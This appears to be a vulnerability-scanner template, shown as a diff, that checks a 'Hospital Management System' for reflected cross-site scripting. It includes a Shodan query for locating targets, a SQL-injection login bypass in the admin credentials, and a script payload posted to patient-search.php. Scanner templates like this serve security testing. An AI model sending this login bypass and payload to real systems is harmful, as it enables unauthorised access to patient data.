@@ -1,0 +1,43 @@
+id: hms-xss-2
+
+info:
+  name: Hospital Management System v1.0 - Cross Site Scripting
+  author: arafatansari
+  severity: medium
+  description: |
+    Hospital Management System v1.0 was discovered to contain a XSS vulnerability via the searchdata parameter in patient-search.php.
+  metadata:
+    shodan-query: http.html:"Hospital Management System"
+    verified: true
+  tags: hms,hospital,cms,xss
+
+requests:
+  - raw:
+      - |
+        POST /hms/admin/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=
+
+      - |
+        POST /hms/admin/patient-search.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        searchdata=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&search=
+
+    skip-variables-check: true
+    redirects: true
+    max-redirects: 2
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<script>alert("XSS")</script>'
+
+      - type: status
+        status:
+          - 200
